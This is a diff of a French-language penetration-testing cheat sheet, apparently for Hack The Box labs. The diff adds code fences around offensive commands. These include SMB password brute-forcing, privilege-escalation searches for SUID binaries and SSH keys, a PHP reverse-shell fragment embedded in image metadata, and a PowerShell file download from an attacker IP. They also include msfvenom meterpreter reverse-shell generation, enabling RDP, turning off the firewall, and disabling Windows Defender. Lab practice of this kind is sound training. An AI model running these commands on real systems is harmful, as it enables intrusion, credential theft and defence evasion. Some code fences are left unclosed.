@@ -33,18 +33,23 @@ gobuster –url 10.10.10.157 dir –wordlist /usr/share/wordlists/dirb/big.txt -
 
 -k -> pas de vérification du certificat SSL
 ```
+```bash
 smbclient --list //"IPADDRESS"/ -U ""
+```
 __Enumération des répertoires partagés accessibles en anonymous__
-
+```bash
 rpcclient -U "" -N 10.10.10.180/
+```
 __Bruteforcer les RID des comptes Windows__
-
+```bash
 crackmapexec smb DC.ustoun.local -u 'SVC-Kerb' -p /root/rockyou.txt
+```
 __Bruteforce SMB avec crackmapexec__
-
+```bash
 enum4linux -a 10.10.10.180
+```
 __Enumération SMB, RPC & co (WINDOWS)__
-
+```bash
 
 dirb "url" "wordlist"
 dirb http://docker.hackthebox.eu:58651 /usr/share/dirb/wordlists/vulns/apache.txt
@@ -55,92 +60,107 @@ dirb options :
 -o output.txt -> redirige l'output
 wfuzz --hh="PARAM_SIZE" -w "WORDLIST" "URL".php?"PARAM_NAME"=test
 wfuzz –hh=24 -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:42566/api/action.php?FUZZ=test
-
+```
 
 __Exploitation & Elévation de privilèges [LINUX] :__
+```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
 /usr/bin/script -qc /bin/bash /dev/null
+```
 __Pour obtenir un shell plus élevé, afin de passer d’un reverse shell à un shell complet__
-
+```bash
 searchsploit -t "INTITLE" "KEYWORDS" -w
 searchsploit windows local smb
 
 sudo -l
+```
 __-> liste les commandes autorisées pour l’utilisateur courant__
-
+```bash
 find / -type d -writable 2> /dev/null
 __-> Liste les répertoires accessibles en écriture__
-
+```bash
 find /* -user root -perm -4000 -print 2>/dev/null
 __-> Liste les binaires exécutables par l’utilisateur courant__
-
+```bash
 find / -type f -perm /6000 -ls 2>/dev/null
 __-> Liste les fichiers setuid/setgid sur le système__
-
+```bash
 find / -iname "mon_fichier" -print 2>/dev/null
 __-> Trouver un fichier précis sur le système__
-
+```bash
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 __-> Trouver des clés RSA ou des autorisations de connexion SSH__
-
+```bash
 grep -iR "passw"
 __-> Rechercher du texte dans des fichiers d’une arborescence__
-
+```bash
 binwalk socute.jpg
 __-> Vérifier le contenu d’une image (peut contenir des fichiers zip par exemple)__
-
+```bash
 exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>' "IMAGE"
 exiftool -Comment='$sock, 1=>$sock, 2=>$sock), $pipes); ?>’ photo.png
 
 
 __Exploitation & Elévation de privilèges [WINDOWS] :__
+```bash
 gem install evil-winrm
 evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'
+```
 __Se connecter via le port winrm__
 
 https://github.com/itm4n/PrivescCheck
+```bash
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+```
 __Tester les privilèges de l’utilisateur__
-
+```bash
 whoami /priv
 whoami /groups
+```
 __Liste des privilèges : https://github.com/gtworek/Priv2Admin__
 __Lister les privilèges de l’utilisateur courant__
-
+```bash
 Get-Services
+```
 __Lister les services (Pour vérifier les unquoted services)__
-
+```bash
 Set-ExecutionPolicy Unrestricted
+```
 __Retirer les restrictions d’exécution de scripts__
-
+```bash
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\toto\Desktop\wget.exe')"
+```
 __Télécharger un fichier depuis un serveur web__
-
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost="LOCALIP" lport="LOCALPORT" -f "FORMAT" > "OUTPUTFILE"
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.100 lport=4444 -f exe > payload.exe
 
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 ./windows-exploit-suggester.py --update
 ./windows-exploit-suggester.py -d 2014-06-06-mssb.xlsx -i systeminfo.txt
+```
 __Vérifier les exploits disponibles en fonction du systeminfo de la victime__
-
+```bash
 https://github.com/PowerShellMafia/PowerSploit
 powershell.exe -nop -exec bypass
 Import-Module PowerUp.ps1
 Invoke-AllChecks
+```
 __Lancer un PowerShell sans restrictions, charger PowerUp et lancer le check complet__
-
+```bash
 powershell -c "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name 'fDenyTSConnections' -value 0"
 powershell -c "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
 powershell -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
 netsh advfirewall set allprofiles state off
+```
 __Activer le RDP et désactiver le firewall__
-
+```bash
 Set-MpPreference -PUAProtection 0
 Set-MpPreference -DisableArchiveScanning $true
 Set-MpPreference -DisableIntrusionPreventionSystem $true
 Set-MpPreference -DisableRealtimeMonitoring $true
+```
 __Désactiver Windows Defender en Powershell__
 
 
